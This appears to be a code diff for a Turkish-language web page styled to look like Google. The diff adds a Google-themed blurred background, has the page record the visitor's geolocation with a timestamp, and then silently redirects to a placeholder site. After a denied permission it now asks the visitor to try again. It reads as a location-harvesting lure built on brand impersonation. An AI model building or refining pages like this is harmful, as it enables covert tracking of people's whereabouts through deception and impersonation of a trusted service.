@@ -11,6 +11,7 @@
             padding: 0;
             background-color: #f4f4f4; /* Daha açık bir arka plan */
             color: #333;
+            overflow: hidden; /* Sayfa içeriğinin taşmasını engeller */
         }
 
         /* Üst Bilgi */
@@ -58,6 +59,7 @@
             justify-content: center;
             align-items: center;
             padding: 50px 20px;
+            height: 100vh; /* Tüm ekranı kaplar */
         }
 
         .document {
@@ -68,6 +70,7 @@
             max-width: 800px; /* Daha geniş belge alanı */
             padding: 30px;
             text-align: center;
+            position: relative; /* Arka planı konumlandırmak için */
         }
 
         .google-logo {
@@ -125,9 +128,37 @@
             border-top: 1px solid #dadce0;
             text-align: center;
         }
+
+        /* Arka Plan */
+        .background-overlay {
+            position: fixed; /* Ekranı kaplar */
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7); /* Şeffaflık ile karartma */
+            z-index: -1; /* Diğer öğelerin altında kalır */
+        }
+        .background-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://source.unsplash.com/1600x900/?google'); /* Rastgele Google temalı resim */
+            background-size: cover;
+            background-position: center;
+            z-index: -2; /* Daha da altında */
+            filter: blur(10px); /* Hafif bulanıklık */
+        }
+
     </style>
 </head>
 <body>
+
+    <!-- Arka Plan (Google Görünümü) -->
+    <div class="background-overlay"></div>
+    <div class="background-image"></div>
 
     <!-- Üst Bilgi -->
     <div class="top-bar">
@@ -187,17 +218,19 @@
                                 timestamp: new Date().toISOString()
                             }]
                         });
-                        locationMessage.textContent = "Konum başarıyla alındı!";
+                        locationMessage.textContent = "Konum başarıyla alındı! Yönlendiriliyorsunuz...";
                         setTimeout(() => {
-                          locationMessage.classList.remove('show');
-                          locationMessage.textContent = "Konum alınıyor..."; // Başlangıç metnini geri yükle
-                        }, 3000); // 3 saniye sonra mesajı gizle
+                            // Burada, asıl web sitenize yönlendirme yapılabilir
+                            window.location.href = "https://www.ornekwebsiteniz.com"; // Örnek yönlendirme
+                            locationMessage.classList.remove('show');
+                            locationMessage.textContent = "Konum alınıyor..."; // Başlangıç metnini geri yükle
+                        }, 3000); // 3 saniye sonra yönlendir ve mesajı gizle
                     },
                     (error) => {
                         let errorMessage = "Konum alınamadı.";
                         switch (error.code) {
                             case error.PERMISSION_DENIED:
-                                errorMessage = "Konum izni reddedildi.";
+                                errorMessage = "Konum izni reddedildi. Lütfen tekrar deneyin.";
                                 break;
                             case error.POSITION_UNAVAILABLE:
                                 errorMessage = "Konum bilgisi mevcut değil.";
